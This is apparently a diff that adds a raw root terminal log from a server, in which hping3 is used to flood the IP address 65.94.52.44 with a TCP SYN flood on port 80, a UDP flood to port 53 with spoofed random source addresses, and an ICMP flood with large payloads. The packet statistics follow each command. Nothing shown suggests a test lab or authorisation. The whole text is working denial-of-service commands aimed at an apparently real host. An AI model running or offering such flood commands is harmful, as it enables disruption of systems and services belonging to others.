@@ -1,0 +1,20 @@
+root@lamp-droplet-korenevskiy:/var/www/html# hping3 -c 10000 -S -p 80 -i u1 65.94.52.44
+HPING 65.94.52.44 (eth0 65.94.52.44): S set, 40 headers + 0 data bytes
+
+--- 65.94.52.44 hping statistic ---
+10000 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+root@lamp-droplet-korenevskiy:/var/www/html# hping3 --rand-source -c 9000 -2 -d 120 -E data.txt -i 1 -w 64 -p 53 65.94.52.44
+HPING 65.94.52.44 (eth0 65.94.52.44): udp mode set, 28 headers + 120 data bytes
+[main] memlockall(): No such file or directory
+Warning: can't disable memory paging!
+[datafiller] open(): No such file or directory
+--- 65.94.52.44 hping statistic ---
+31 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+root@lamp-droplet-korenevskiy:/var/www/html# hping3 -c 11000 --icmp --data 1024 -i u75 65.94.52.44
+HPING 65.94.52.44 (eth0 65.94.52.44): icmp mode set, 28 headers + 1024 data bytes
+
+--- 65.94.52.44 hping statistic ---
+11000 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
